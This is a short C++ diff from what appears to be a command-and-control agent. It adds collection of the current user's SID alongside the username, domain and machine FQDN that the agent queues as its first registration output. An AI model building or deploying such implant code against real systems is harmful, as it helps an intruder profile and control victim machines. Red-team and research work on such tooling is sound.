@@ -35,6 +35,7 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
         strAgentRegister);
 
     // Buffer variables
+    LPVOID pSidString = NULL;
     LPVOID pUserName = NULL;
     LPVOID pDomainName = NULL;
     LPVOID pFqdnComputer = NULL;
@@ -44,7 +45,7 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
     LPVOID pRegistrationData = NULL;
 
     // Get logged-in username and hostname of computer, then concat them
-    this->pWinApiCustom->GetUserNameCustom(&pUserName, &pDomainName);
+    this->pWinApiCustom->GetCurrentUserCustom((CHAR **)(&pSidString), (CHAR **)(&pUserName), (CHAR **)(&pDomainName));
     pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
     if (pUserName == NULL || pDomainName == NULL || pFqdnComputer == NULL)
         goto CLEANUP;
@@ -90,6 +91,9 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
     this->pTaskOutputQueue->ReleaseThreadMutex();
 
 CLEANUP:
+    if (pSidString != NULL)
+        this->pWinApiCustom->HeapFreeCustom(pSidString);
+
     if (pUserName != NULL)
         this->pWinApiCustom->HeapFreeCustom(pUserName);
 
